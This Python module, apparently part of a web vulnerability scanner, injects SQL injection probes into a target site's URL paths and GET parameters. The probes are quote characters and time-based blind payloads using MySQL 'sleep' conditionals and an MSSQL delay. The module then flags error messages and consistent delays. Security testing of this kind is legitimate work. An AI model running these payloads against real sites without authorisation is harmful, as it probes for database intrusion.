import urllib.parse as urlparse
from datetime import datetime
from typing import List

from Managers.CacheManager import CacheManager
from Managers.RequestHandler import RequestHandler
from Models.GetRequestDTO import GetRequestDTO
from Models.SqliFoundDTO import SqliFoundDTO, SqliType


class SqliManager:
    def __init__(self, domain, cookies, headers):
        self._domain = domain
        self._error_based_payloads = ['\'', '\\', '"', '%27', '%5C']
        self._time_based_payloads = [
            {'TruePld': '1\'OR(if(1=1,sleep(5),0))OR\'2', 'FalsePld': '1\'OR(if(1=2,sleep(5),0))OR\'2'},
            {'TruePld': '1\'OR(if(1=1,sleep(5),0))--%20', 'FalsePld': '1\'OR(if(1=2,sleep(5),0))--%20'},
            {'TruePld': '1; WAIT FOR DELAY \'00:00:05', 'FalsePld': '1; WAIT FOR DELAY \'00:00:01'},
        ]
        self._delay_in_seconds = 5
        self._request_handler = RequestHandler(cookies, headers)
        self._expected = 'syntax'

    def check_get_requests(self, dtos: List[GetRequestDTO]):

        cache_manager = CacheManager('SqliManager', self._domain)
        result = cache_manager.get_saved_result()

        if result is None:
            result: List[SqliFoundDTO] = []
            for dto in dtos:
                self.__check_url(dto, result)
                self.__check_get_params(dto, result)

            cache_manager.save_result(result, has_final_result=True)

        print(f'[{datetime.now().strftime("%H:%M:%S")}]: ({self._domain}) SqliManager GET found {len(result)} items')

    def __check_url(self, dto: GetRequestDTO, result: List[SqliFoundDTO]):

        parsed = urlparse.urlparse(dto.url)
        base_url = f'{parsed.scheme}://{parsed.hostname}{parsed.path}/'
        for payload in self._error_based_payloads:
            self.__send_error_based_request(f'{base_url}{payload}', result)

        for payloads in self._time_based_payloads:
            self.__send_time_based_request(f'{base_url}{payloads["TruePld"]}', f'{base_url}{payloads["FalsePld"]}',
                                           result)

    def __check_get_params(self, dto: GetRequestDTO, result: List[SqliFoundDTO]):
        error_based_payloads_urls = set()
        time_based_payloads_urls = set()
        parsed = urlparse.urlparse(dto.url)
        queries = filter(None, parsed.query.split("&"))

        for query in queries:
            param_split = query.split('=')
            main_url_split = dto.url.split(query)
            for payloads in self._time_based_payloads:
                time_based_payloads_urls.add(
                    (f'{main_url_split[0]}{param_split[0]}={payloads["TruePld"]}{main_url_split[1]}',
                     f'{main_url_split[0]}{param_split[0]}={payloads["FalsePld"]}{main_url_split[1]}'))
            for payload in self._error_based_payloads:
                error_based_payloads_urls.add(f'{main_url_split[0]}{param_split[0]}={payload}{main_url_split[1]}')

        for payload in error_based_payloads_urls:
            self.__send_error_based_request(payload, result)

        for payloads in time_based_payloads_urls:
            self.__send_time_based_request(payloads[0], payloads[1], result)

    def __send_error_based_request(self, url, result: List[SqliFoundDTO]):
        try:
            response = self._request_handler.handle_request(url)
            if response is None:
                return
            if response.status_code == 200 or str(response.status_code)[0] == '5':
                if not response.history or response.history[0].status_code != 301:
                    web_page = response.text.lower()
                    if self._expected in web_page:
                        substr_index = web_page.find(self._expected)
                        start_index = substr_index - 50 if substr_index - 50 > 0 else 0
                        last_index = substr_index + 50 if substr_index + 50 < len(web_page) else substr_index
                        log_header_msg = f'injFOUND "{self._expected}":' \
                                         f'STATUS-{response.status_code};' \
                                         f'DETAILS-{web_page[start_index:last_index]};'
                        curr_resp_length = len(web_page)
                        if len(result) == 0 or \
                                len(list(filter(lambda dto: dto.response_length == curr_resp_length, result))) < 5:
                            print(log_header_msg)
                            result.append(SqliFoundDTO(url, SqliType.ERROR))
                        else:
                            print("Duplicate GET SQLI: - " + url)

        except Exception as inst:
            print(f"Exception - ({url}) - {inst}")

    def __send_time_based_request(self, true_payload, false_payload, result: List[SqliFoundDTO]):
        response1 = self._request_handler.handle_request(true_payload)
        if response1 is not None and response1.elapsed.total_seconds() >= self._delay_in_seconds:
            response2 = self._request_handler.handle_request(false_payload)
            if response2 is not None and response2.elapsed.total_seconds() < self._delay_in_seconds:
                response3 = self._request_handler.handle_request(true_payload)
                if response3 is not None and response3.elapsed.total_seconds() >= self._delay_in_seconds:
                    print(f"SQLiManager delay FOUND: - {true_payload} - {false_payload}")
                    return result.append(SqliFoundDTO(true_payload, SqliType.TIME))
